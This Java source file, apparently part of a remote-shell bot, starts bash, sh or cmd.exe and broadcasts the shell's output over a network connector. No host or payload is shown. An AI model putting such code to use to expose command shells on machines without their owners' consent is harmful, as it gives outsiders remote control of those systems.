package com.github.kvac.shells.shells.bot.proc;

import com.github.kvac.shells.shells.bot.header.SHELLHEADER;
import java.io.File;
import java.io.PrintWriter;
import java.util.Scanner;
import org.apache.commons.lang.SystemUtils;

/**
 *
 * @author jdcs_dev
 */
public class ProcessHandler extends Thread implements Runnable {

    Process process;
    Scanner scanner;//OUTPUT
    PrintWriter printWriter;//INPUT

    String cmdShell = null;

    public ProcessHandler() {

    }

    @Override
    public void run() {
        if (SystemUtils.IS_OS_LINUX) {
            String E_PATH = System.getenv("PATH");
            String[] paths = E_PATH.split(":");
            for (String path : paths) {
                File testFileBASH = new File(path, "bash");
                if (testFileBASH.exists()) {
                    cmdShell = testFileBASH.getAbsolutePath();
                    break;
                }
                File testFileSH = new File(path, "sh");
                if (testFileSH.exists()) {
                    cmdShell = testFileSH.getAbsolutePath();
                }
            }
        } else if (SystemUtils.IS_OS_WINDOWS) {
            cmdShell = "cmd.exe";
        }

        try {
            ProcessBuilder processBuilder = new ProcessBuilder(cmdShell);
            processBuilder.redirectErrorStream(true);

            process = processBuilder.start();
            getStreams();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void getStreams() {
        System.out.println("com.github.kvac.minecraft.minashells.proc.ProcessHandler.getStreams(1)");
        scanner = new Scanner(process.getInputStream());
        System.out.println("com.github.kvac.minecraft.minashells.proc.ProcessHandler.getStreams(2)");

        printWriter = new PrintWriter(process.getOutputStream());
        System.out.println("com.github.kvac.minecraft.minashells.proc.ProcessHandler.getStreams(3)");
        while (scanner.hasNext()) {
            String next = scanner.next();
            SHELLHEADER.getNIOCONNECTOR().broadcast(next);
        }
        System.out.println("com.github.kvac.minecraft.minashells.proc.ProcessHandler.getStreams(4)");
    }

}
